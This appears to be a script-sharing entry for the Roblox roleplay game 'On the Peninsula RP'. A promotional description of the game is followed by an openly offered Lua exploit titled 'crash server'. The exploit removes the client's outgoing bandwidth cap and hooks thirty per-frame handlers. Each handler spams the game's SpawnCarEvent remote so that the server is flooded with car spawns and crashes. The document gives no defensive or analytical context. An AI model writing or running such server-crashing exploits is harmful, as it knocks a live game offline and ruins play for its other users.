name: On the Peninsula RP
desc:
On the Peninsula is a roleplay game, set in a rural 1990s charming small-town on the peninsula of the US, featuring advanced character customization, car personalization, house furnishing, and more!. Explore, create, and make new friends for endless roleplay possibilities!

👍 Leave a like if you enjoyed! 

✨Join our Group to receive exclusive perks in-game like name-tag customization!
https://www.roblox.com/communities/33727810

⚠️This game is still being developed. Please be patient with issues. In-game data stability cannot be guaranteed.

scripts.title: crash server Open Source
scripts.script:
-- @build-failed
-- crash server

local getservice = game.GetService
local runservice, replicatedstorage, networkclient = getservice(game, "RunService"), getservice(game, "ReplicatedStorage"), getservice(game, "NetworkClient")
networkclient:SetOutgoingKBPSLimit(math.huge)
local SpawnCarEvent = replicatedstorage:WaitForChild("SystemEvents"):WaitForChild("SpawnCarEvent")

local args = {
	"Spawn",
	"1972 Fortner F500",
	CFrame.new(241.3, 28, -796.6)
}

for i = 1, 30 do
    runservice.Heartbeat:Connect(function()
        SpawnCarEvent:FireServer(unpack(args))
    end)
end
